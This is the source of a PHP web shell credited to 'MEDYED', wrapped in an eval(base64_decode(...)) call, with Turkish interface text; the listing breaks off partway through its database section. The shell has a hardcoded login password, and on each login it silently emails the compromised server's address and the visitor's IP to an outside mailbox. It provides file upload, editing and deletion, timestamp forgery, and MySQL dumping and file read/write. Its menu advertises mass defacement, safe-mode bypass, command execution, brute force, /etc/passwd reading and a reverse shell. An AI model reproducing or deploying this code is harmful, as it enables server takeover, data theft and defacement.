<?php eval ("?>".base64_decode("<?php
/****************************************\
|*         Coder&By MEDYED            *|
\****************************************/

error_reporting(7);
@set_magic_quotes_runtime(0);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
//define('IS_WIN', strstr(PHP_OS, 'WIN') ? 1 : 0 );
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0 );
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
@set_time_limit(0);

foreach(array('_GET','_POST') as $_request) {
	foreach($$_request as $_key => $_value) {
		if ($_key{0} != '_') {
			if (IS_GPC) {
				$_value = s_array($_value);
			}
			$$_key = $_value;
		}
	}
}

/*=================  Info Login  ================*/
$admin = array();
$admin['check'] = true;
$admin['pass']  = 'medyed'; // Password login
$admin['cookiepre'] = '';
$admin['cookiedomain'] = '';
$admin['cookiepath'] = '/';
$admin['cookielife'] = 86400;
/*===================== End =====================*/

if ($charset == 'utf8') {
	header("content-Type: text/html; charset=utf-8");
} elseif ($charset == 'big5') {
	header("content-Type: text/html; charset=big5");
} elseif ($charset == 'gbk') {
	header("content-Type: text/html; charset=gbk");
} elseif ($charset == 'latin1') {
	header("content-Type: text/html; charset=iso-8859-2");
}

$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();

/*===================== Login =====================*/
if ($action == "logout") {
	scookie('vbapass', '', -86400 * 365);
	p('<meta http-equiv="refresh" content="0;URL='.$self.'">');
	p('<body background=black>');
	exit;
}
if($admin['check']) {
	if ($doing == 'login') {
		if ($admin['pass'] == $password) {
			scookie('vbapass', $password);

// No Problem.:)
$time_shell = "".date("d/m/Y - H:i:s")."";
$ip_remote = $_SERVER["REMOTE_ADDR"];
$from_shellcode = 'shell@'.gethostbyname($_SERVER['SERVER_NAME']).'';
$to_email = 'medyed01@yandex.com';
$server_mail = "".gethostbyname($_SERVER['SERVER_NAME'])."  - ".$_SERVER['HTTP_HOST']."";
$linkcr = "Link: ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']." - IP Excuting: $ip_remote - Time: $time_shell";
$header = "From: $from_shellcode\r\nReply-to: $from_shellcode";
@mail($to_email, $server_mail, $linkcr, $header);
			p('<meta http-equiv="refresh" content="2;URL='.$self.'">');
			p('<body bgcolor=black>
<BR><BR><div align=center><font color=yellow face=tahoma size=2>MEDYED Shellimize Hosgeldiniz. Lutfen Bekleyin...<BR><img src=http://i.hizliresim.com/KrlnYM.png></div>');
			exit;
		}

	else
	{
	$err_mess = '<table width=100%><tr><td bgcolor=#0E0E0E width=100% height=24><div align=center><font color=red face=tahoma size=2><blink>Şifre Hatalı, Lutfen Tekrar Deneyin..</blink><BR></font></div></td></tr></table>';
echo $err_mess;
	}}
	if ($_COOKIE['vbapass']) {
		if ($_COOKIE['vbapass'] != $admin['pass']) {
			loginpage();
		}
	} else {
		loginpage();
	}
}
/*===================== Giris =====================*/

$errmsg = '';

if ($action == 'phpinfo') {
	if (IS_PHPINFO) {
		phpinfo();
	} else {
		$errmsg = 'phpinfo() function has non-permissible';
	}
}


if ($doing == 'downfile' && $thefile) {
	if (!@file_exists($thefile)) {
		$errmsg = 'The file you want Downloadable was nonexistent';
	} else {
		$fileinfo = pathinfo($thefile);
		header('Content-type: application/x-'.$fileinfo['extension']);
		header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
		header('Content-Length: '.filesize($thefile));
		@readfile($thefile);
		exit;
	}
}


if ($doing == 'backupmysql' && !$saveasfile) {
	dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
	$table = array_flip($table);
	$result = q("SHOW tables");
	if (!$result) p('<h2>'.mysql_error().'</h2>');
	$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');
	header('Content-type: application/unknown');
	header('Content-Disposition: attachment; filename='.$filename);
	$mysqldata = '';
	while ($currow = mysql_fetch_array($result)) {
		if (isset($table[$currow[0]])) {
			$mysqldata .= sqldumptable($currow[0]);
		}
	}
	mysql_close();
	exit;
}

// Mysql
if($doing=='mysqldown'){
	if (!$dbname) {
		$errmsg = 'Please input dbname';
	} else {
		dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		if (!file_exists($mysqldlfile)) {
			$errmsg = 'The file you want Downloadable was nonexistent';
		} else {
			$result = q("select load_file('$mysqldlfile');");
			if(!$result){
				q("DROP TABLE IF EXISTS tmp_angel;");
				q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
				//Download SQL
				q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
				$result = q("select content from tmp_angel");
				q("DROP TABLE tmp_angel");
			}
			$row = @mysql_fetch_array($result);
			if (!$row) {
				$errmsg = 'Load file failed '.mysql_error();
			} else {
				$fileinfo = pathinfo($mysqldlfile);
				header('Content-type: application/x-'.$fileinfo['extension']);
				header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
				header("Accept-Length: ".strlen($row[0]));
				echo $row[0];
				exit;
			}
		}
	}
}

?>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><?php echo str_replace('.','',' MEDYED Shell ');?></title>
<style type="text/css">
body,td{font: 10pt Tahoma;color:gray;line-height: 16px;}

a {color: #74A202;text-decoration:none;}
a:hover{color: #f00;text-decoration:underline;}
.alt1 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
.fout1 td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
.fout td{border-top:1px solid gray;border-bottom:0px solid gray;background:#202020;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:bold;}
.head_small td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:normal;font-size:8pt;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
input, textarea, button
{
	font-size: 9pt;
	color: #ccc;
	font-family: verdana, sans-serif;
	background-color: #202020;
	border-left: 1px solid #74A202;
	border-top: 1px solid #74A202;
	border-right: 1px solid #74A202;
	border-bottom: 1px solid #74A202;
}
select
{
	font-size: 8pt;
	font-weight: normal;
	color: #ccc;
	font-family: verdana, sans-serif;
	background-color: #202020;
}

</style>
<script type="text/javascript">
function CheckAll(form) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function $(id) {
	return document.getElementById(id);
}
function goaction(act){
	$('goaction').action.value=act;
	$('goaction').submit();
}
</script>
</head>
<body onLoad="init()" style="margin:0;table-layout:fixed; word-break:break-all" bgcolor=black background=http://i.hizliresim.com/El7yWB.png>


<div border="0" style="position:fixed; width: 100%; height: 25px; z-index: 1; top: 300px; left: 0;" id="loading" align="center" valign="center">
				<table border="1" width="110px" cellspacing="0" cellpadding="0" style="border-collapse: collapse" bordercolor="#003300">
					<tr>

						<td align="center" valign=center>
				 <div border="1" style="background-color: #0E0E0E; filter: alpha(opacity=70); opacity: .7; width: 110px; height: 25px; z-index: 1; border-collapse: collapse;" bordercolor="#006600"  align="center">
				  Yukleniyor..<img src="http://www.zone-h.org/images/star.gif">
				  </div>
				</td>
					</tr>
				</table>
			 </div>


 <script>
 var ld=(document.all);
  var ns4=document.layers;
 var ns6=document.getElementById&&!document.all;
 var ie4=document.all;
  if (ns4)
 	ld=document.loading;
 else if (ns6)
 	ld=document.getElementById("loading").style;
 else if (ie4)
 	ld=document.all.loading.style;
  function init()
 {
 if(ns4){ld.visibility="hidden";}
 else if (ns6||ie4) ld.display="none";
 }
 </script>




<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head_small">
		<td  width=100%>
		<table width=100%><tr class="head_small"><td  width=86px><a title="Hacker MEDYED" href="<?php $self;?>"></td><td>
		<span style="float:left;">  </a> | <a href="javascript:goaction('logout');"><font color=red>Kapat</font></a></span> <br />

		<?php
		$curl_on = @function_exists('curl_version');
		$mysql_on = @function_exists('mysql_connect');
		$mssql_on = @function_exists('mssql_connect');
		$pg_on = @function_exists('pg_connect');
		$ora_on = @function_exists('ocilogon');

echo (($safe_mode)?("Guvenlık Duvarı : <b><font color=green>ON</font></b> - "):("Guvenlik Duvarı <b><font color=green>OFF</font></b> - "));
echo "PHP version: <b>".@phpversion()."</b> - ";
		echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b> - "):("<b><font color=red>OFF</font></b> - "));
		echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>ON</font></b> - "; } else { echo "<font color=red>OFF</font></b> - "; }
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font></b> - ";}else{echo "<font color=red>OFF</font></b> - ";}
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font></b> - ";}else{echo "<font color=red>OFF</font></b> - ";}
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b><BR>";}

echo "Yasakli Fonksionlar : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b><BR>";}else{echo "<font color=red>$df</font></b><BR>";}

echo "<font color=white>Uname -a</font>: ".@substr(@php_uname(),0,120)."<br>";
echo "<font color=white>Server</font>: ".@substr($SERVER_SOFTWARE,0,120)." - <font color=white>id</font>: ".@getmyuid()."(".@get_current_user().") - uid=".@getmyuid()." (".@get_current_user().") gid=".@getmygid()."(".@get_current_user().")<br>";
		?>
		</td></tr></table></td>

	</tr>
	<tr class="alt1">
		<td  width=10%><span style="float:left;">[Server IP: <?php echo "<font color=yellow>".gethostbyname($_SERVER['SERVER_NAME'])."</font>";?> - Kendi IP'im: <?php echo "<font color=yellow>".$_SERVER['REMOTE_ADDR']."</font>";?>] </span>   <br />
<font color="white">-|^_^|-</font><font color="red">---------------------------</font><font color="white">---------------------------</font><font color="red">---------------------------</font><font color="white">---------------------------</font><font color="red">---------------------------</font><font color="white">---------------------------</font><font color="red">>>>>></font><br/>
			
			<a href="javascript:goaction('file');">Dosya yonetim</a> <font color='white'>|</font>
			<a href="javascript:goaction('sqladmin');">MySQL yonetim</a> <font color='white'>|</font>
			<a href="javascript:goaction('sqlfile');">MySQL yukle &amp; indir</a> <font color='white'>|</font>
			<a href="javascript:goaction('shell');">Gorev komutu</a> <font color='white'>|</font>
			<a href="javascript:goaction('phpenv');">PHP </a> <font color='white'>|</font>
			<a href="javascript:goaction('eval');">PHP Kodu</a> <font color='white'>|</font>
			<a href="javascript:goaction('massdeface');">Mass Deface</a> <font color='white'>|</font>
			<a href="javascript:goaction('symlink');">Sym</a> <font color='white'>|</font>
			<a href="javascript:goaction('star');">Star</a> <font color='white'>|</font>
			<a href="javascript:goaction('basson');">Basa Sona Kod Ekle</a> <font color='white'>|</font>
			<a href="javascript:goaction('bypass');">Bypass <font color='red'>-1-</font></a> <font color='white'>|</font>
			<a href="javascript:goaction('bypass2');">Bypass <font color='red'>-2-</font></a> <font color='white'>|</font>
			<a href="javascript:goaction('newcommand');">CMD Command</a>  <font color='white'>|</font>
			<a href="javascript:goaction('av3.log');">CGI Telnet</a>
			
			<?php if (!IS_WIN) {?> <font color='white'>|</font> <a href="javascript:goaction('brute');">Brute Force</a> <?php }?>
			<?php if (!IS_WIN) {?> <font color='white'>|</font> <a href="javascript:goaction('etcpwd');">/etc/passwd</a> <?php }?>
			<?php if (!IS_WIN) {?> <font color='white'>|</font> <a href="javascript:goaction('backconnect');">Ters Baglanti</a><?php }?>

		</td>
	</tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php

formhead(array('name'=>'goaction'));
makehide('action');
formfoot();

$errmsg && m($errmsg);

// Dir function
!$dir && $dir = '.';
$nowpath = getPath(SA_ROOT, $dir);
if (substr($dir, -1) != '/') {
	$dir = $dir.'/';
}
$uedir = ue($dir);

if (!$action || $action == 'file') {

	// Non-writeable
	$dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';

	// Delete dir
	if ($doing == 'deldir' && $thefile) {
		if (!file_exists($thefile)) {
			m($thefile.' directory does not exist');
		} else {
			m('Directory delete '.(deltree($thefile) ? basename($thefile).' success' : 'failed'));
		}
	}

	// Create new dir
	elseif ($newdirname) {
		$mkdirs = $nowpath.$newdirname;
		if (file_exists($mkdirs)) {
			m('Directory has already existed');
		} else {
			m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));
			@chmod($mkdirs,0777);
		}
	}

	// Upload file
	elseif ($doupfile) {
		m('Dosya Yukleme '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'Basarili' : 'failed'));
	}

	// Edit file
	elseif ($editfilename && $filecontent) {
		$fp = @fopen($editfilename,'w');
		m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
		@fclose($fp);
	}

	// Modify
	elseif ($pfile && $newperm) {
		if (!file_exists($pfile)) {
			m('The original file does not exist');
		} else {
			$newperm = base_convert($newperm,8,10);
			m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));
		}
	}

	// Rename
	elseif ($oldname && $newfilename) {
		$nname = $nowpath.$newfilename;
		if (file_exists($nname) || !file_exists($oldname)) {
			m($nname.' has already existed or original file does not exist');
		} else {
			m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));
		}
	}

	// Copu
	elseif ($sname && $tofile) {
		if (file_exists($tofile) || !file_exists($sname)) {
			m('The goal file has already existed or original file does not exist');
		} else {
			m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));
		}
	}

	// File exit
	elseif ($curfile && $tarfile) {
		if (!@file_exists($curfile) || !@file_exists($tarfile)) {
			m('The goal file has already existed or original file does not exist');
		} else {
			$time = @filemtime($tarfile);
			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
		}
	}

	// Date
	elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
		if (!@file_exists($curfile)) {
			m(basename($curfile).' does not exist');
		} else {
			$time = strtotime("$year-$month-$day $hour:$minute:$second");
			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
		}
	}

	// Download
	elseif($doing == 'downrar') {
		if ($dl) {
			$dfiles='';
			foreach ($dl as $filepath => $value) {
				$dfiles.=$filepath.',';
			}
			$dfiles=substr($dfiles,0,strlen($dfiles)-1);
			$dl=explode(',',$dfiles);
			$zip=new PHPZip($dl);
			$code=$zip->out;
			header('Content-type: application/octet-stream');
			header('Accept-Ranges: bytes');
			header('Accept-Length: '.strlen($code));
			header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');
			echo $code;
			exit;
		} else {
			m('Please select file(s)');
		}
	}

	// Delete file
	elseif($doing == 'delfiles') {
		if ($dl) {
			$dfiles='';
			$succ = $fail = 0;
			foreach ($dl as $filepath => $value) {
				if (@unlink($filepath)) {
					$succ++;
				} else {
					$fail++;
				}
			}
			m('Deleted file have finished??choose '.count($dl).' success '.$succ.' fail '.$fail);
		} else {
			m('Please select file(s)');
		}
	}

	// Function Newdir
	formhead(array('name'=>'createdir'));
	makehide('newdirname');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'fileperm'));
	makehide('newperm');
	makehide('pfile');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'copyfile'));
	makehide('sname');
	makehide('tofile');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'rename'));
	makehide('oldname');
	makehide('newfilename');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'fileopform'));
	makehide('action');
	makehide('opfile');
	makehide('dir');
	formfoot();

	$free = @disk_free_space($nowpath);
	!$free && $free = 0;
	$all = @disk_total_space($nowpath);
	!$all && $all = 0;
	$used = $all-$free;
	$used_percent = @round(100/($all/$free),2);
	p('<font color=yellow face=tahoma size=2><B>Dosya Yoneticisi = </b> </font><font color=white> Dolu Disk Alanı</font> <font color=blue>:</font> <font color=red>'.sizecount($free).'</font> <font color=white>Toplam Alan</font> <font color=blue>:  </font><font color=red>'.sizecount($all).'</font> <font color=orange>( </font><font color=red><b>'.$used_percent.'</b></font><font color=orange>%)</font>');

?>

<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
  <form action="" method="post" id="godir" name="godir">
  <tr>
    <td nowrap><font color='yellow' ><b>Bulundugun Dizin = </b></font>(<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
	<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:100%;margin:0 8px;"></td>
    <td nowrap><input class="bt" value="Git" type="submit"></td>
  </tr>
  </form>

</table>
<script type="text/javascript">
function createdir(){
	var newdirname;
	newdirname = prompt('Please input the directory name:', '');
	if (!newdirname) return;
	$('createdir').newdirname.value=newdirname;
	$('createdir').submit();
}
function fileperm(pfile){
	var newperm;
	newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
	if (!newperm) return;
	$('fileperm').newperm.value=newperm;
	$('fileperm').pfile.value=pfile;
	$('fileperm').submit();
}
function copyfile(sname){
	var tofile;
	tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
	if (!tofile) return;
	$('copyfile').tofile.value=tofile;
	$('copyfile').sname.value=sname;
	$('copyfile').submit();
}
function rename(oldname){
	var newfilename;
	newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
	if (!newfilename) return;
	$('rename').newfilename.value=newfilename;
	$('rename').oldname.value=oldname;
	$('rename').submit();
}
function dofile(doing,thefile,m){
	if (m && !confirm(m)) {
		return;
	}
	$('filelist').doing.value=doing;
	if (thefile){
		$('filelist').thefile.value=thefile;
	}
	$('filelist').submit();
}
function createfile(nowpath){
	var filename;
	filename = prompt('Please input the file name:', '');
	if (!filename) return;
	opfile('editfile',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
	$('fileopform').action.value=action;
	$('fileopform').opfile.value=opfile;
	$('fileopform').dir.value=dir;
	$('fileopform').submit();
}
function godir(dir,view_writable){
	if (view_writable) {
		$('godir').view_writable.value=1;
	}
	$('godir').dir.value=dir;
	$('godir').submit();
}
</script>
  <?php
	tbhead();
	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">');
	p('<div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="" name="doupfile" value="Yukle" type="submit" /><input name="uploaddir" value="'.$dir.'" type="hidden" /><input name="dir" value="'.$dir.'" type="hidden" /></div>');
	p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">Ana Dizin</a>');
	if ($view_writable) {
		p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
	} else {
		p(' | <a href="javascript:godir(\''.$nowpath.'\',\'1\');">View Writable</a>');
	}
	p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Create File</a>');
	if (IS_WIN && IS_COM) {
		$obj = new COM('scripting.filesystemobject');
		if ($obj && is_object($obj)) {
			$DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');
			foreach($obj->Drives as $drive) {
				if ($drive->DriveType == 2) {
					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Size:'.sizecount($drive->TotalSize).'&#13;Free:'.sizecount($drive->FreeSpace).'&#13;Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
				} else {
					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
				}
			}
		}
	}

	p('</td></tr></form>');

	p('<tr class="head"><td>&nbsp;</td><td>Dosya Adi</td><td width="16%">Sonraki</td><td width="10%">Boyut</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');

	// Get path
	$dirdata=array();
	$filedata=array();

	if ($view_writable) {
		$dirdata = GetList($nowpath);
	} else {
		// Open dir
		$dirs=@opendir($dir);
		while ($file=@readdir($dirs)) {
			$filepath=$nowpath.$file;
			if(@is_dir($filepath)){
				$dirdb['filename']=$file;
				$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$dirdb['dirchmod']=getChmod($filepath);
				$dirdb['dirperm']=getPerms($filepath);
				$dirdb['fileowner']=getUser($filepath);
				$dirdb['dirlink']=$nowpath;
				$dirdb['server_link']=$filepath;
				$dirdb['client_link']=ue($filepath);
				$dirdata[]=$dirdb;
			} else {
				$filedb['filename']=$file;
				$filedb['size']=sizecount(@filesize($filepath));
				$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$filedb['filechmod']=getChmod($filepath);
				$filedb['fileperm']=getPerms($filepath);
				$filedb['fileowner']=getUser($filepath);
				$filedb['dirlink']=$nowpath;
				$filedb['server_link']=$filepath;
				$filedb['client_link']=ue($filepath);
				$filedata[]=$filedb;
			}
		}// while
		unset($dirdb);
		unset($filedb);
		@closedir($dirs);
	}
	@sort($dirdata);
	@sort($filedata);
	$dir_i = '0';
	foreach($dirdata as $key => $dirdb){
		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
			$thisbg = bg();
			p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
			p('<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>');
			p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');
			p('<td nowrap>'.$dirdb['mtime'].'</td>');
			p('<td nowrap>--</td>');
			p('<td nowrap>');
			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].'</a> / ');
			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');
			p('<td nowrap><a href="javascript:dofile(\'deldir\',\''.$dirdb['server_link'].'\',\'Are you sure will delete '.$dirdb['filename'].'? \\n\\nIf non-empty directory, will be delete all the files.\')">Sil</a> | <a href="javascript:rename(\''.$dirdb['server_link'].'\');">Yeniden Adlandir</a></td>');
			p('</tr>');
			$dir_i++;
		} else {
			if($dirdb['filename']=='..') {
				p('<tr class=fout>');
				p('<td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');
				p('</tr>');
			}
		}
	}

	p('<tr bgcolor="green" stlye="border-top:1px solid gray;border-bottom:1px solid gray;"><td colspan="6" height="5"></td></tr>');
	p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');
	makehide('action','file');
	makehide('thefile');
	makehide('doing');
	makehide('dir',$nowpath);
	$file_i = '0';
	foreach($filedata as $key => $filedb){
		if($filedb['filename']!='..' && $filedb['filename']!='.') {
			$fileurl = str_replace(SA_ROOT,'',$filedb['server_link']);
			$thisbg = bg();
			p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
			p('<td width="2%" nowrap><input type="checkbox" value="1" name="dl['.$filedb['server_link'].']"></td>');
			p('<td><a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a></td>');
			p('<td nowrap>'.$filedb['mtime'].'</td>');
			p('<td nowrap>'.$filedb['size'].'</td>');
			p('<td nowrap>');
			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].'</a> / ');
			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');
			p('<td nowrap>');
			p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">İndir</a> | ');
			p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Kopyala</a> | ');
			p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Duzenle</a> | ');
			p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Yeniden Adlandir</a> | ');
			p('<a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Zaman</a>');
			p('</td></tr>');
			$file_i++;
		}
	}
	p('<tr class="fout1"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Secili Olanlarini İndir</a><font color="white"><b> - </b></font><a href="javascript:dofile(\'delfiles\');">Seçili Olanlarini Sil</a></td><td colspan="4" align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
	p('</form></table>');
}// end dir

elseif ($action == 'sqlfile') {
	if($doing=="mysqlupload"){
		$file = $_FILES['uploadfile'];
		$filename = $file['tmp_name'];
		if (file_exists($savepath)) {
			m('The goal file has already existed');
		} else {
			if(!$filename) {
				m('Please choose a file');
			} else {
				$fp=@fopen($filename,'r');
				$contents=@fread($fp, filesize($filename));
				@fclose($fp);
				$contents = bin2hex($contents);
				if(!$upname) $upname = $file['name'];
				dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
				$result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
				m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
			}
		}
	}
?>

<script type="text/javascript">
function mysqlfile(doing){
	if(!doing) return;
	$('doing').value=doing;
	$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
	$('mysqlfile').dbport.value=$('dbinfo').dbport.value;
	$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
	$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
	$('mysqlfile').dbname.value=$('dbinfo').dbname.value;
	$('mysqlfile').charset.value=$('dbinfo').charset.value;
	$('mysqlfile').submit();
}
</script>
<?php
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	$charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');
	formhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));
	makehide('action','sqlfile');
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p(':');
	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	p('DBName:');
	makeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));
	p('DBCharset:');
	makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));
	p('</p>');
	formfoot();
	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">');
	p('<h2>Upload file</h2>');
	p('<p><b>This operation the DB user must has FILE privilege</b></p>');
	p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
	p('<h2>Download file</h2>');
	p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
	makehide('dbhost');
	makehide('dbport');
	makehide('dbuser');
	makehide('dbpass');
	makehide('dbname');
	makehide('charset');
	makehide('doing');
	makehide('action','sqlfile');
	p('</form>');
}

elseif ($action == 'sqladmin') {
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	$dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
	if(isset($dbhost)){
		$dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
	}
	if(isset($dbuser)) {
		$dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
	}
	if(isset($dbpass)) {
		$dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
	}
	if(isset($dbport)) {
		$dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
	}
	if(isset($dbname)) {
		$dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
	}
	if(isset($charset)) {
